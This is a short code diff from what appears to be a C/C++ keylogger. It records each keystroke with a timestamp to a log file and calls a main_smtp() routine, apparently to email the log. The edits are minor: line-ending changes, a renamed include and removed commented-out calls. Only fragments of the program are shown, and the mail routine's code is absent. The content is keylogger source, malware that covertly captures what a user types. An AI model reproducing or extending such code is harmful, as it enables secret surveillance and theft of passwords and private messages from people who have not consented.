@@ -36,8 +36,6 @@ int main()
 
    main_smtp();
 
-   system("PAUSE");
-
    return 0;
 }
 
@@ -52,14 +50,14 @@ bool log(int key_stroke)
    time_t rawtime;
    time (&rawtime);
 
-   printf("(%lu) %d=%s\n", rawtime, key_stroke, (char*) &key_stroke);
+   printf("(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
 
    if(key_stroke == VK_F2)
    {
       return false;
    }else
    {
-      fprintf(myFile,"(%lu) %d=%s\n", rawtime, key_stroke, (char*) &key_stroke);
+      fprintf(myFile,"(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
       fclose(myFile);
       return true;
    }
@@ -78,7 +76,7 @@ using std::string;
 #include "keyrecord.h"
 #include "keyvalue.h"
 using namespace keylog;
-#include "smtp-attach.h"
+#include "smtp_attach.h"
 
 
 int main() {
@@ -121,10 +119,6 @@ int main() {
 
 
     keytxt.close();
-
-        //main_tls(fopen(db_filename.c_str(), "r"));
-
-        //main_smtp();
 
     main_smtp();
 
